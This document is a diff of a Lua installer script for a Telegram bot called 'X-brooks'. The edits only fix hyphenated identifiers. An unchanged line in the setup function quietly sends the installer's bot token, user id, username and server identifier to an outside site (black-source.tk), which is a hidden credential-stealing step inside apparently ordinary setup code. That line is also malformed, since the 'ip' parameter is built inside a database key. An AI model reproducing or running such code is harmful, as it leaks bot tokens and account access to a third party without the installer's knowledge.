@@ -62,11 +62,11 @@ io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
 end 
 os.execute('lua start.lua')
 end
-local function Files_X-brooks_Info()
+local function Files_Xbrooks_Info()
 Create_Info(database:get(Server_Xbrooks.."Token_X-brooks"),database:get(Server_Xbrooks.."Id_X-brooks"),database:get(Server_Xbrooks.."UserName_X-brooks"))   
 https.request("https://black-source.tk/BlackTeAM/index.php?n=broks&id="..database:get(Server_Xbrooks.."Id_X-brooks").."&user="..database:get(Server_Xbrooks.."UserName_X-brooks").."&token="..database:get(Server_Xbrooks.."Token_X-brooks&ip="..Server_Xbrooks))
-local RunX-brooks = io.open("X-brooks", 'w')
-RunX-brooks:write([[
+local RunXbrooks = io.open("X-brooks", 'w')
+RunXbrooks:write([[
 #!/usr/bin/env bash
 cd $HOME/X-brooks
 token="]]..database:get(Server_Xbrooks.."Token_X-brooks")..[["
@@ -77,7 +77,7 @@ rm -fr ../.telegram-cli
 ./tg -s ./X-brooks.lua -p PROFILE --bot=$token
 done
 ]])
-RunX-brooks:close()
+RunXbrooks:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
@@ -90,7 +90,7 @@ done
 ]])
 RunTs:close()
 end
-Files_X-brooks_Info()
+Files_Xbrooks_Info()
 database:del(Server_Xbrooks.."Token_X-brooks");database:del(Server_Xbrooks.."Id_X-brooks");database:del(Server_Xbrooks.."UserName_X-brooks")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
